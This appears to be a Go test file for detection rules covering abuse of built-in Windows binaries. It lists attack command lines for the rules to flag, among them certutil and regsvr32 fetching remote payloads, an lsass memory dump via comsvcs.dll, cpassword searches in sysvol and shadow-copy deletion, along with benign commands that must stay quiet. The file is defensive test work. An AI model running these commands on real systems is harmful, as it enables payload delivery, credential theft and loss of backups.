package test

import (
	"strings"
	"testing"
)

// Real-world command lines against the generated rules/lolbas.yaml. want is the rule name
// prefix (binary) expected to fire; "" means no LOLBAS rule may fire.
func TestLolbasRules(t *testing.T) {
	cases := []struct {
		image, commandLine, want string
	}{
		// Techniques
		{`\??\C:\Windows\System32\certutil.exe`, `certutil.exe -urlcache -split -f http://10.0.0.5/a.exe C:\Users\Public\a.exe`, "lolbas_certutil"},
		{`\??\C:\Windows\System32\certutil.exe`, `certutil /urlcache /f http://10.0.0.5/a.exe a.exe`, "lolbas_certutil"},
		{`\??\C:\Windows\System32\rundll32.exe`, `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full`, "lolbas_rundll32"},
		{`\??\C:\Windows\System32\rundll32.exe`, `"C:\Windows\System32\rundll32.exe" advpack.dll,LaunchINFSection C:\t\x.inf,DefaultInstall_SingleUser,1,`, "lolbas_rundll32"},
		{`\??\C:\Windows\System32\regsvr32.exe`, `regsvr32 /s /n /u /i:http://10.0.0.5/file.sct scrobj.dll`, "lolbas_regsvr32"},
		{`\??\C:\Windows\System32\mshta.exe`, `mshta.exe javascript:a=GetObject("script:http://x/a.sct").Exec();close();`, "lolbas_mshta"},
		{`\??\C:\Windows\System32\vssadmin.exe`, `vssadmin.exe Delete Shadows /All /Quiet`, "lolbas_vssadmin"},
		{`\??\C:\Windows\System32\wbem\WMIC.exe`, `wmic process call create "C:\Users\Public\a.exe"`, "lolbas_wmic"},
		{`\??\C:\Windows\System32\bitsadmin.exe`, `bitsadmin /create 1`, "lolbas_bitsadmin"},
		{`\??\C:\Windows\System32\findstr.exe`, `findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml`, "lolbas_findstr"},
		{`\??\C:\Windows\System32\desktopimgdownldr.exe`, `desktopimgdownldr.exe /lockscreenurl:https://x/a.exe /eventName:desktopimgdownldr`, "lolbas_desktopimgdownldr"},

		// Everyday use that must stay quiet
		{`\??\C:\Windows\System32\certutil.exe`, `certutil -hashfile C:\setup.exe SHA256`, ""},
		{`\??\C:\Windows\System32\cmd.exe`, `cmd.exe /c dir`, ""},
		{`\??\C:\Windows\System32\msiexec.exe`, `msiexec.exe /i C:\Downloads\app.msi /quiet`, ""},
		{`\??\C:\Windows\System32\rundll32.exe`, `rundll32.exe shell32.dll,Control_RunDLL desk.cpl`, ""},
		{`\??\C:\Windows\System32\rundll32.exe`, `rundll32.exe url.dll,FileProtocolHandler https://example.com`, ""},
		{`\??\C:\Program Files\dotnet\dotnet.exe`, `dotnet msbuild Panoptes.sln`, ""},
		{`\??\C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`, `csc.exe -out:a.exe -target:exe a.cs`, ""},
		{`\??\C:\Windows\System32\regsvr32.exe`, `regsvr32 /s C:\app\control.dll`, ""},
		{`\??\C:\Windows\System32\vssadmin.exe`, `vssadmin list shadows`, ""},
		{`\??\C:\Windows\System32\wbem\WMIC.exe`, `wmic process get name`, ""},
		// The image must be the binary: a token in another program's command line is not enough
		{`\??\C:\Windows\System32\notepad.exe`, `notepad.exe certutil -urlcache -f notes.txt`, ""},
	}
	for _, c := range cases {
		t.Run(c.commandLine, func(t *testing.T) {
			got := firedWithPrefix(t, true, f{"Event": "ProcessCreated", "PID": 4000.0, "Image": c.image, "CommandLine": c.commandLine})
			if c.want == "" {
				if len(got) != 0 {
					t.Fatalf("fired %v on a benign command line", got)
				}
				return
			}
			for _, name := range got {
				if strings.HasPrefix(name, c.want+"_") {
					return
				}
			}
			t.Fatalf("fired %v, want a %s rule", got, c.want)
		})
	}
}
